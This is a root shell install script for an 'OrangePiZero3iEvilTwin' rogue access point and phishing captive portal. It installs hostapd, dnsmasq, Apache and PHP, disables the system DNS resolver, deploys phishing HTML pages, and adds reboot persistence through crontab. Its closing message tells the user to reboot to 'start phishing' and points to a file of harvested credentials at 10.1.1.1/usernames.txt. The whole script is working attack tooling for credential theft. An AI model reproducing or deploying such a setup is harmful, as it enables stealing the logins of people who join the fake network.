#!/bin/sh -e

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi

echo "Installing dependencies..."
apt-get install -y macchanger hostapd dnsmasq apache2 php

echo "Disabling service systemd-resolved..."
systemctl stop systemd-resolved
systemctl disable systemd-resolved.service


echo "Configuring components..."
echo "Setting up hostapd..."
cp -f hostapd.conf /etc/
echo "Setting up dnsmasq..."
cp -f dnsmasq.conf /etc/
echo "Setting up HTML Files..."
cp -Rf html /var/www/
chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess
echo "Copying startup script..."
cp -f OrangePiZero3iEvilTwin.sh /root/
crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo sh /root/OrangePiZero3iEvilTwin.sh && sudo service dnsmasq restart &"; } | crontab -
echo "Setting up permissions..."
chmod +x /root/OrangePiZero3iEvilTwin.sh
echo "Setting up Apache Config..."
a2dismod mpm_event
a2enmod mpm_prefork
cp -f override.conf /etc/apache2/conf-available/
cd /etc/apache2/conf-enabled
ln -s ../conf-available/override.conf override.conf
cd /etc/apache2/mods-enabled
ln -s ../mods-available/rewrite.load rewrite.load

echo "..."
crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo service dnsmasq restart &"; } | crontab -
echo "..."
echo "OrangePiZero3iEvilTwin captive portal installed. Reboot and wait 30 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
exit 0
